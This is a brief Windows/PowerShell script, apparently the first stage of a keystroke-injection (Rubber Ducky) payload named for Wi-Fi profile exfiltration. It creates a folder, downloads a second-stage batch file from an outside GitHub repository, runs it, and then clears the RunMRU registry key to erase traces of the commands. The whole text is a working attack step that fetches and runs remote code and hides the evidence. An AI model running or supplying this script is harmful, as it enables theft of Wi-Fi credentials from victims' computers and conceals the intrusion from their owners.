cd /;mkdir x64;cd x64;
wget https://github.com/s3luX/RDucky_payloads/blob/main/wifi_profiles_exfil/stage_2.bat -OutFile stage2.bat
start stage2.bat
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
exit
